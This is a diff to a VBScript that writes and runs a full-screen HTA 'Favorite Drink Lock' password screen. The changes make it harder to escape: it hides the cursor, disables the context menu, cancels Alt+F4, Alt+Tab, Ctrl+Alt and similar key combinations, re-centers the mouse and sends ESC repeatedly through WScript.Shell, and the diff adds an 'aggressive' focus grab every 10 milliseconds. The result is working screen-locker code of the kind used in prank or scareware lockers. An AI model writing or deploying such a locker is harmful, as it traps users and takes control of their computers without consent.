@@ -1,4 +1,4 @@
-' lockscreen_final_blocked.vbs
+' lockscreen_final_locked.vbs
 Option Explicit
 
 Dim fso, shell, htaPath, htaText
@@ -7,12 +7,11 @@ Set shell = CreateObject("WScript.Shell")
 
 htaPath = fso.GetSpecialFolder(2) & "\lockscreen.hta"
 
-' Build HTA content
 htaText = _
 "<html>" & vbCrLf & _
 "<head>" & vbCrLf & _
 "    <title>Favorite Drink Lock</title>" & vbCrLf & _
-"    <hta:application id=""lockapp"" border=""none"" maximizeButton=""no"" minimizeButton=""no"" showInTaskbar=""no"" sysmenu=""no"" scroll=""no"" windowstate=""maximize"" />" & vbCrLf & _
+"    <hta:application id=""lockapp"" border=""none"" maximizeButton=""no"" minimizeButton=""no"" scroll=""no"" windowstate=""maximize"" />" & vbCrLf & _
 "    <style>" & vbCrLf & _
 "        html, body { margin:0; padding:0; width:100%; height:100%; background-color:black; color:white; font-family:Arial; display:flex; justify-content:center; align-items:center; flex-direction:column; user-select:none; overflow:hidden; cursor:none; }" & vbCrLf & _
 "        #title { font-size:36px; margin-bottom:20px; }" & vbCrLf & _
@@ -42,24 +41,25 @@ htaText = _
 "        document.oncontextmenu = function(){ return false; };" & vbCrLf & _
 "        document.onselectstart = function(){ return false; };" & vbCrLf & _
 "" & vbCrLf & _
-"        // Block common escape combos" & vbCrLf & _
-"        document.onkeydown = function(e) {" & vbCrLf & _
-"            e = e || window.event;" & vbCrLf & _
-"            try {" & vbCrLf & _
-"                if (e.altKey && (e.keyCode === 115 || e.key === 'F4')) return cancelEvent(e);" & vbCrLf & _
-"                if (e.altKey && e.keyCode === 9) return cancelEvent(e); // Alt+Tab" & vbCrLf & _
-"                if (e.altKey && e.keyCode === 27) return cancelEvent(e); // Alt+Esc" & vbCrLf & _
-"                if (e.ctrlKey && e.altKey) return cancelEvent(e); // Ctrl+Alt combos" & vbCrLf & _
-"                if (e.altKey && e.keyCode === 46) return cancelEvent(e); // Alt+Del" & vbCrLf & _
-"            } catch(ex){}" & vbCrLf & _
-"        };" & vbCrLf & _
-"" & vbCrLf & _
 "        function cancelEvent(ev) {" & vbCrLf & _
 "            if(ev.preventDefault) ev.preventDefault();" & vbCrLf & _
 "            ev.returnValue = false;" & vbCrLf & _
 "            return false;" & vbCrLf & _
 "        }" & vbCrLf & _
 "" & vbCrLf & _
+"        // Block common escape combos" & vbCrLf & _
+"        document.onkeydown = function(e) {" & vbCrLf & _
+"            e = e || window.event;" & vbCrLf & _
+"            try {" & vbCrLf & _
+"                if(e.altKey && (e.keyCode === 115 || e.key === 'F4')) return cancelEvent(e);" & vbCrLf & _
+"                if(e.altKey && e.keyCode === 9) return cancelEvent(e);" & vbCrLf & _
+"                if(e.altKey && e.keyCode === 27) return cancelEvent(e);" & vbCrLf & _
+"                if(e.ctrlKey && e.altKey) return cancelEvent(e);" & vbCrLf & _
+"                if(e.altKey && e.keyCode === 46) return cancelEvent(e);" & vbCrLf & _
+"            } catch(ex){}" & vbCrLf & _
+"        };" & vbCrLf & _
+"" & vbCrLf & _
+"        // Aggressive mouse recentralization and ESC blasting" & vbCrLf & _
 "        function centerMouse() {" & vbCrLf & _
 "            try {" & vbCrLf & _
 "                var shell = new ActiveXObject('WScript.Shell');" & vbCrLf & _
@@ -75,6 +75,12 @@ htaText = _
 "            setTimeout(centerMouse,10);" & vbCrLf & _
 "        }" & vbCrLf & _
 "        centerMouse();" & vbCrLf & _
+"" & vbCrLf & _
+"        // Aggressive focus regain" & vbCrLf & _
+"        setInterval(function(){" & vbCrLf & _
+"            try { window.focus(); document.getElementById('pw').focus(); } catch(e){}" & vbCrLf & _
+"        },10);" & vbCrLf & _
+"" & vbCrLf & _
 "    </script>" & vbCrLf & _
 "</body>" & vbCrLf & _
 "</html>"
